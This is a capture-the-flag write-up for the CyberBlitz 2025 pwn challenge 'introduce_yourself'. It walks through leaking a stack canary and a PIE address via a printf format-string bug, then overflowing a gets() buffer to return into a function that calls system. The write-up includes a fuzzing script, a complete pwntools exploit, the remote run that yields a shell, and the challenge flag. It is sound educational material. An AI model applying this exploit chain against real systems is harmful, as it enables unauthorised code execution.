---
title: introduce_yourself
author: yufong
categories:  [CyberBlitz 2025, Pwn]
date: 2025-12-23
tags: 
  - 64-bit
  - ret2win
  - canary
  - piebase
info:
  description: "You are now enrolled as an SIT student, it is of good manners that you should introduce yourself and get to know more people!"
  difficulty: 2
img_path: /_posts/Writeups/CTF/CyberBlitz%202025/Pwn/Introduce%20Yourself/attachments/
image:
  path: /_posts/Writeups/CTF/CyberBlitz%202025/Pwn/Toy%20Gadgets/attachments/cyberblitz2025.png
  width: 1000   # in pixels
  height: 400   # in pixels
---

## Challenge Description

{{page.info.description}}

## Exploit

### Check Security

```
~/labs/ctf/cyberblitz2025/pwn/introduce_yourself
❯ file intro
intro: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=cb78e1a5dbb1e38db671569e5b8853660c164de5, for GNU/Linux 3.2.0, not stripped
```

> Breakdown
>- The binary is not stripped, meaning symbol information is preserved.
>- Function names (e.g. `main`, `win`) and symbol addresses are available.
>- TLDR, easier to rev.

```
~/labs/ctf/cyberblitz2025/pwn/introduce_yourself
❯ checksec --file=./intro --format=json | jq
{
  "./intro": {
    "relro": "full",
    "canary": "yes",
    "nx": "yes",
    "pie": "yes",
    "rpath": "no",
    "runpath": "no",
    "symbols": "yes",
    "fortify_source": "no",
    "fortified": "0",
    "fortify-able": "3"
  }
}
```

> Breakdown
>- `canary: yes`
>	- Stack canary protection is enabled.
>	- The return address cannot be overwritten directly. 
>	- No simple buffer overflow here.
>- `nx:yes`
>	- The stack is non-executable, preventing injected shellcode from running.
>	- Don't matter here since its a `ret2win` challenge.
>- `pie:yes`
>	- The binary is loaded at a randomized base address.
>	- A PIE leak is required to calculate the correct runtime address of the target function.

### Vulnerability Analysis

1. View functions

	```
	pwndbg> info func
	All defined functions:
	
	Non-debugging symbols:
	0x0000000000001000  _init
	0x0000000000001030  putchar@plt
	0x0000000000001040  puts@plt
	0x0000000000001050  __stack_chk_fail@plt
	0x0000000000001060  system@plt
	0x0000000000001070  printf@plt
	0x0000000000001080  fgets@plt
	0x0000000000001090  gets@plt
	0x00000000000010a0  setvbuf@plt
	0x00000000000010b0  __cxa_finalize@plt
	0x00000000000010c0  main
	0x00000000000010d0  _start
	0x0000000000001100  deregister_tm_clones
	0x0000000000001130  register_tm_clones
	0x0000000000001170  __do_global_dtors_aux
	0x00000000000011b0  frame_dummy
	0x00000000000011c0  welcome
	0x00000000000012a0  gift
	0x00000000000012b0  _fini
	```

	>`gift` Function
	>- Address: `0x12a0`
	>- Little-Endian: `\xa0\x12\x00\x00\x00\x00\x00\x00`

2. Disassemble `welcome`

	>- Showing Only String Format Vulnerability & Buffer Overflow

	```
	...SNIP...
   0x000000000000122b <+107>:   mov    esi,0x64
   0x0000000000001230 <+112>:   mov    rdi,rsp
   0x0000000000001233 <+115>:   call   0x1080 <fgets@plt>
   ...SNIP...
   0x0000000000001246 <+134>:   mov    rdi,rsp
   0x0000000000001249 <+137>:   xor    eax,eax
   0x000000000000124b <+139>:   call   0x1070 <printf@plt>
   ...SNIP...
   0x0000000000001268 <+168>:   lea    rdi,[rsp+0x70]
   0x000000000000126d <+173>:   call   0x1090 <gets@plt>
	```

	>String Format Vuln Breakdown
	>- `mov esi, 0x64` 
	>	- Stores `0x64 = 100` into `esi`
	>	- This sets the maximum number of bytes that `fgets()` will read.
	>	- So its safe from buffer overflow.
	>- `mov rdi, rsp`
	>	- Stores `rsp` into `rdi` 
	>	- This is the buffer address where `fgets()` will be writing to.
	>- `call 0x1080 <fgets@plt>`
	>	- Calls `fgets(buffer=rsp, size=100, stdin)`
	>	- So its safe from buffer overflow.
	>- `mov rdi,rsp`
	>	- Stores `rsp` into `rdi` again
	>	- `rsp` points to user argument
	>- `call 0x1070 <printf@plt>`
	>	- Calls `printf(rsp)`
	>	- This is where it is susceptible to string format exploit
	>	- Able to use format specifiers (`%p`, `%x`, `%s`) to leak memory addresses

	>BOF Vuln Breakdown
	>- `lea rdi,[rsp+0x70]`
	>	- Load effective address of `rsp+0x70` which is the buffer address where `gets()` is writing to.
	>- `call 0x1090 <gets@plt>`
	>	- Calls `gets(rdi)`
	>	- Susceptible to buffer overflow.

3. Decompiled `welcome` in ghidra for easier understanding
	![]({{ page.img_path }}introduce_yourself-1766426537248.png)

	> Breakdown
	>- Line 15–17: User input is read safely but printed via `printf(buffer)`, susceptbile to string format vulnerability.
	>- Line 20: `gets()`, susceptible to buffer overflow.

4. Disassemble `gift`

	```
	pwndbg> disas gift
	Dump of assembler code for function gift:
	   0x00000000000012a0 <+0>:     lea    rdi,[rip+0xda6]        # 0x204d
	   0x00000000000012a7 <+7>:     xor    eax,eax
	   0x00000000000012a9 <+9>:     jmp    0x1060 <system@plt>
	End of assembler dump.
	pwndbg>
	```

	![]({{ page.img_path }}introduce_yourself-1766428144858.png)

	> Able to do code execution if jumped to this function.

### Find Canary Offset

1. Turn off ASLR

	```
	~/labs/ctf/cyberblitz2025/pwn/introduce_yourself
	❯ echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
	0
	```

2. Examine the decompiled code

	```c
	void welcome(void)
	{
	   long in_FS_OFFSET;              // FS segment base (thread-local storage)
	
	   char acStack_e8 [112];          // buffer used by fgets (safe)
	   char local_78 [104];            // buffer used by gets (VULNERABLE)
	   long local_10;                  // local copy of stack canary
	
	   // ---- stack canary setup ----
	   local_10 = *(long *)(in_FS_OFFSET + 0x28);
	
	   setvbuf(stdout,(char *)0x0,2,0);
	   setvbuf(stdin,(char *)0x0,2,0);
	   setvbuf(stderr,(char *)0x0,2,0);
	
	   puts("Type in your name below:");
	   fgets(acStack_e8,100,stdin);    // safe, bounded
	   printf("Nice to meet you ");
	   printf(acStack_e8);             // FORMAT STRING BUG
	   putchar(10);
	
	   puts("Give your message of the day?");
	   gets(local_78);                 // STACK OVERFLOW
	
	   // ---- stack canary check ----
	   if (local_10 == *(long *)(in_FS_OFFSET + 0x28)) {
	       return;
	   }
	
	   __stack_chk_fail();
	}
	```

	> Breakdown
	>- `char acStack_e8 [112]; `
	>	- The buffer is allocated on the stack.
	>	- Used by `fgets()` with a strict length (`100`).
	>	- Not susceptible to buffer overflow 
	>	- Susceptible to string format exploit to leak addresses.
	>- `char local_78 [104];`
	>	- Allocated on the stack below the canary.
	>	- Used by `gets()` with no bounds checking.
	>	- Susceptible to buffer overflow.
	>	- Exploiting it
	>		1. Offset to Stack Canary.
	>		2. Canary Address (to preserve), so no smashing detected.
	>		3. Offset to `RBP`.
	>		4. Return for stack alignment.
	>		5. Function to win.
	>- `long local_10; `
	>	- The buffer is allocated on the stack.
	>	- Used to store a local copy of the per-thread stack canary for stack protection.
	>- `local_10 = *(long *)(in_FS_OFFSET + 0x28);`
	>	- Reads the global canary from thread-local storage.
	>	- Copies it into the stack frame (`local_10`)
	>	- To be compared before returning to detect bof.

3. Overflow diagram

	```
	higher addresses
	────────────────────────
	saved RIP
	saved RBP
	local_10        ← stack canary (8 bytes)
	local_78[104]   ← gets() buffer (overflowable)
	acStack_e8[112] ← fgets() buffer (safe)
	────────────────────────
	lower addresses
	```

	> Breakdown
	>- Buffer overflows to higher addresses where the canary, `rbp` and `rip` is located.
	>- Our buffer overflow will not affect elements on the stack located at lower addresses. Such as `acStack_e8[112]`.

	> Offset to Canary
	>- `local_78` (overflowable buffer) starts at offset `0x78`
	>- `local_10` (canary) is located at offset `0x10`
	>- `0x78 - 0x10 = 0x68 = 104 bytes`
	>- 104 bytes are required to reach the start of the stack canary

4. Examine the assembly (further verify offset to canary is `0x68=104`)
	![]({{ page.img_path }}introduce_yourself-1766377400356.png)

	> Breakdown
	>- `local_78` starts at `RBP - 0x78`
	>- `local_10` (canary copy) starts at `RBP - 0x10`
	>- `0x78 - 0x10 = 0x68 = 104 bytes`

### Leak Canary Address

1. `fuzz.py`

	```c
	from pwn import *
	
	
	# Allows you to switch between local/GDB/remote from terminal
	def start(argv=[], *a, **kw):
	    if args.GDB:  # Set GDBscript below
	        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
	    else:  # Run locally
	        return process([exe] + argv, *a, **kw)
	
	
	# Specify your GDB script here for debugging
	gdbscript = '''
	b main
	'''.format(**locals())
	
	
	# Set up pwntools for the correct architecture
	exe = './intro'
	# This will automatically get context arch, bits, os etc
	elf = context.binary = ELF(exe, checksec=False)
	# Enable verbose logging so we can see exactly what is being sent (info/debug)
	context.log_level = 'warning'
	
	for i in range(50):
	    try:
	        p = start()
	        # Format the counter
	        # e.g. %2$s will attempt to print [i]th pointer/string/hex/char/int
	        p.sendlineafter(b'Type in your name below:', '%{}$p'.format(i).encode())
	        # Receive the response
	        p.recvuntil(b'Nice ')
	        result = p.recvline()
	        print(str(i) + ': ' + str(result))
	        p.close()
	    except EOFError:
	        pass
	```

2. Fuzz it

	```
	~/labs/ctf/cyberblitz2025/pwn/introduce_yourself
	❯ python3 fuzz.py > fuzz.out
	
	~/labs/ctf/cyberblitz2025/pwn/introduce_yourself
	❯ python3 fuzz.py > fuzz2.out
	```

3. Find candidates of possible Canary Address

	```
	~/labs/ctf/cyberblitz2025/pwn/introduce_yourself
	❯ diff fuzz.out fuzz2.out | grep "00"
	< 33: b'to meet you 0xdd26dfdb54027a00\n'
	> 33: b'to meet you 0x456acbd9c6a9df00\n'
	< 43: b'to meet you 0x2fd9ede2442f008d\n' <-ignore
	```

	> To Note
	>- Canary always changes despite ASLR turned off (unlike PIEBASE).
	>- Canary is designed to have `00` at the least significant byte to check if smashed the stack.
	>- Canary Index: `33`

### Leak PIE Address

1. Find PIE Base Address from `pwndbg`

	```
	pwndbg> b main
	pwndbg> r
	...SNIP...
	pwndbg> piebase
	Calculated VA from /home/kali/labs/ctf/cyberblitz2025/pwn/introduce_yourself/intro = 0x555555554000
	```

	> To Note
	>- PIE Base Address: `0x555555554000`

2. Fuzz it

	```
	~/labs/ctf/cyberblitz2025/pwn/introduce_yourself
	❯ python3 fuzz.py > fuzz3.out
	```

3. Find candidates of possible Canary Address

	```
	~/labs/ctf/cyberblitz2025/pwn/introduce_yourself
	❯ cat fuzz3.out | grep 0x5
	35: b'to meet you 0x5555555550c9\n'
	39: b'to meet you 0x5555555550c0\n'
	47: b'to meet you 0x555555557d88\n'
	```

	> To Note
	>- Addresses starting with `0x5555…` belongs to the main PIE binary.
	>- All these addresses can be used to derive the PIE Base Address.
	>- Each leaked value is a code pointer inside the PIE binary.
	>- `leaked_address = PIEBASE + function_offset`

4. Edit code

	```python
	...SNIP...
	# Let's fuzz x values
	for i in range(35, 36):
	    try:
	        p = start()
	        # Format the counter
	        # e.g. %2$s will attempt to print [i]th pointer/string/hex/char/int
	        p.sendlineafter(b'Type in your name below:', '%{}$p'.format(i).encode())
	        # Receive the response
	        p.recvuntil(b'Nice ')
	        result = p.recvline()
	        print(str(i) + ': ' + str(result))
	        p.close()
	    except EOFError:
	        pass
	```

5. Send it with `GDB` argument

	```
	~/labs/ctf/cyberblitz2025/pwn/introduce_yourself
	❯ python3 fuzz.py GDB
	35: b'to meet you 0x5555555550c9\n'
	
	~/labs/ctf/cyberblitz2025/pwn/introduce_yourself
	❯ python3 fuzz.py GDB
	35: b'to meet you 0x5555555550c9\n'
	```

	> Notice that the Address doesn't change.

	![]({{ page.img_path }}introduce_yourself-1766379435619.png)

	> `0x5555555550c9 <main+9>`, we have chosen the right address.

6. Determine the offset from PIE Base Address

	```
	(gdb) x 0x5555555550c9 - 0x555555554000
	0x10c9: Cannot access memory at address 0x10c9
	```

	> To Note
	>- `Offset`: `0x10c9`
	>- `Leaked Address - 0x10c9 = PIE Base Address`

### Find Gadgets

1. Find `ret`

	```
	~/labs/ctf/cyberblitz2025/pwn/introduce_yourself
	❯ ropper -f intro --search "ret"
	
	[INFO] Load gadgets from cache
	[LOAD] loading... 100%
	[LOAD] removing double gadgets... 100%
	[INFO] Searching for gadgets: ret
	
	[INFO] File: intro
	0x0000000000001016: ret;
	```

	> To Note
	>- Utilized for stack alignment.
	>	- The `ret` gadget is used to adjust `RSP` by 8 bytes to restore 16-byte stack alignment on x64 before entering a real function.
	>- Address: `1016`
	>- Little-Endian: `\x16\x10\x00\x00\x00\x00\x00\x00`

### Exploit

Steps

| Step | Purpose                 | Value                     |
| ---- | ----------------------- | ------------------------- |
| 1    | Padding to Canary       | `104`                     |
| 2    | Canary                  | Canary Address at Runtime |
| 3    | Padding to RBP          | `8`                       |
| 4    | Stack alignment (`ret`) | `0x1016`                  |
| 5    | `gift()`                | `x`                |

> Also, don't forget PIE Leak.

`exploit.py`, edit "CHANGE HERE" section.

```python
from pwn import *

exe = "./intro"
elf = context.binary = ELF(exe, checksec=False)
context.log_level = "debug"

def start():
    if args.REMOTE:
        return remote(sys.argv[1], int(sys.argv[2]))
    return process(exe)

# CHANGE ME
OFFSET_TO_CANARY = 104
OFFSET_TO_RBP = 8
CANARY_IDX = 33
PIE_IDX = 35
PIE_SUBTRACT = 0x10c9
RET_GADGET = 0x1016 
WIN_SYM = "gift"
# END

io = start()

# ---- Leak ----
fmt = f"%{CANARY_IDX}$p.%{PIE_IDX}$p".encode()
io.sendlineafter(b"Type in your name below:\n", fmt)
# io.sendlineafter(b"Type in your name below:\n", b"%33$p.%35$p")
io.recvuntil(b"to meet you ")
canary_s, pie_s = io.recvline().strip().split(b".")

canary = int(canary_s, 16)
pie_leak = int(pie_s, 16)

log.info(f"canary   = {canary:#x}")
log.info(f"pie leak = {pie_leak:#x}")

# ---- PIE base ----
elf.address = pie_leak - PIE_SUBTRACT
log.info(f"pie base = {elf.address:#x}")

win_addr = elf.symbols[WIN_SYM]
log.info(f"{WIN_SYM}() = {win_addr:#x}")

# ---- ret gadget (alignment) ----
ret = elf.address + RET_GADGET  # adjust if different
log.info(f"ret gadget = {ret:#x}")

# ---- Payload ----
payload = flat([
    b"A" * OFFSET_TO_CANARY,
    canary,
    b"B" * OFFSET_TO_RBP,
    ret,
    win_addr
])

io.sendlineafter(b"Give your message of the day?\n", payload)
io.interactive()
```

Results

```
~/labs/ctf/cyberblitz2025/pwn/introduce_yourself
❯ python3 exploit.py REMOTE blitzinstance1.ddns.net 33523
[+] Opening connection to blitzinstance1.ddns.net on port 33523: Done
[DEBUG] Received 0x18 bytes:
    b'Type in your name below:'
[DEBUG] Received 0x1 bytes:
    b'\n'
[DEBUG] Sent 0xc bytes:
    b'%33$p.%35$p\n'
[DEBUG] Received 0x11 bytes:
    b'Nice to meet you '
[DEBUG] Received 0x41 bytes:
    b'0x57628079e31ea900.0x55efded3f0c9\n'
    b'\n'
    b'Give your message of the day?\n'
[*] canary   = 0x57628079e31ea900
[*] pie leak = 0x55efded3f0c9
[*] pie base = 0x55efded3e000
[*] gift() = 0x55efded3f2a0
[*] ret gadget = 0x55efded3f016
[DEBUG] Sent 0x89 bytes:
    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
    *
    00000060  41 41 41 41  41 41 41 41  00 a9 1e e3  79 80 62 57  │AAAA│AAAA│····│y·bW│
    00000070  42 42 42 42  42 42 42 42  16 f0 d3 de  ef 55 00 00  │BBBB│BBBB│····│·U··│
    00000080  a0 f2 d3 de  ef 55 00 00  0a                        │····│·U··│·│
    00000089
[*] Switching to interactive mode
$ cat flag.txt
[DEBUG] Sent 0xd bytes:
    b'cat flag.txt\n'
[DEBUG] Received 0x25 bytes:
    b'CyberBlitz2025{c@n_C@n_st@ck_f0rm@t}\n'
CyberBlitz2025{c@n_C@n_st@ck_f0rm@t}
```

<video muted autoplay controls style="width: 740px; height: 460px;">
    <source src="{{site.cdn}}{{page.img_path}}AqCy39dkex.mp4" type="video/mp4">
</video>